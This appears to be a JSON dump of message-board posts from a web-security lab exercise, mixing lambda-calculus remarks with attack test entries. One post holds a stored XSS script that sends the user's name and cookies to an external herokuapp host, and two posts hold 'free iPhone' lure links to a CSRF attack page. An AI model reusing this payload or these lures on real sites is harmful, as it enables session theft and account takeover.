{"6effff75e1dab7eba3fb036184f5bcd3":{"username":"M. Schönfinkel","cardText":"It suffices with the S and K combinators!","time":"Mon Mar 21 2022 1:12:44 PM"},"a360ddf52349dcddebeecfa5cd688696":{"username":"H. Curry","cardText":"There is a strong connection between lambda calculus and logic!","time":"Mon Mar 21 2022 1:13:39 PM"},"79497b03721c9ca490a007b1c45200c2":{"username":"A. Church","cardText":"Do you like lambda calculus?","time":"Mon Mar 21 2022 1:14:23 PM"},"67996676cc927628eff5f1f300380abc":{"username":"daniel","cardText":"<script> var xhttp = new XMLHttpRequest(); console.log(document.getElementsByClassName(\"input-group-text\")[0].innerHTML);  xhttp.open(\"POST\", \"https://dva446.herokuapp.com/store/156\", true);  var username=document.getElementsByClassName(\"input-group-text\")[0].innerHTML;  xhttp.send(username+\":\"+document.cookie); </script>","time":"Mon Mar 21 2022 3:27:19 PM"},"1a3c89b19169460728d4065851c6a683":{"username":"daniel","cardText":"csrf test to check how the request is made!","time":"Tue Mar 22 2022 2:17:08 PM"},"d9ff93cb296de357eb66f283276c744d":{"username":"M. Schönfinkel","cardText":"Click <a href='https://localhost:8000/csrfAttack.html'>here</a> to get the iPhobe X FREE!","time":"Tue Mar 22 2022 2:27:18 PM"},"e75a61cde7b5abff8a83b4844db87527":{"username":"A. Church","cardText":"Click <a href='https://localhost:8000/csrfAttack.html'>here</a> to get the iPhobe X FREE!","time":"Tue Mar 22 2022 2:33:38 PM"},"4ded019bedb01f4422e98cebd42ad23c":{"username":"testUser","cardText":"testUser","time":"Thu Mar 24 2022 3:25:03 PM"}}